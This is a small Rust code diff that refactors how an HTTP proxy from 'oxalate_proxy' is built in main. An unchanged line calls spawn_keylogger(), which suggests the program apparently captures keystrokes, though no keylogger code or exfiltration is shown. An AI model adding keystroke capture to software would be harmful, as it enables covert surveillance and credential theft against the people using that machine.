@@ -6,8 +6,7 @@ use oxalate_proxy::{HttpProxy, ProxyHttpResponse};
 #[tokio::main]
 async fn main() {
     let rx = spawn_keylogger();
-    let http_proxy = HttpProxy::new(Duration::from_secs(1));
-    let http_proxy = Arc::new(http_proxy);
+    let http_proxy = Arc::new(HttpProxy::new(Duration::from_secs(1)));
 
     println!("Hello, world!");
 }
